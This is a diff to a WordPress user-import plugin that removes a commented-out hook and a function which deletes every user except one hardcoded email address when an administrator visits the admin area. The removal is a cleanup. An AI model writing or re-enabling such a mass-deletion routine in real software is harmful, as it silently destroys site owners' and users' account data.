@@ -33,30 +33,6 @@ class UserImportPlugin {
 
         // Enqueue scripts and styles
         add_action('admin_enqueue_scripts', array($this, 'enqueue_scripts'));
-
-        // ✅ New action to delete users
-        // add_action('admin_init', array($this, 'delete_all_except_specific_user'));
-    }
-
-    // Delete users
-    public function delete_all_except_specific_user() {
-        // Only allow admin users
-        if (!current_user_can('administrator')) {
-            return;
-        }
-
-        $keep_email = 'ami.globaliasoft@gmail.com';
-        $users = get_users();
-
-        foreach ($users as $user) {
-            if ($user->user_email !== $keep_email) {
-                wp_delete_user($user->ID);
-            }
-        }
-
-        // Optional message (only for testing)
-        echo 'All users except ' . esc_html($keep_email) . ' have been deleted.';
-        exit;
     }
 
     // Create Table on plugin active
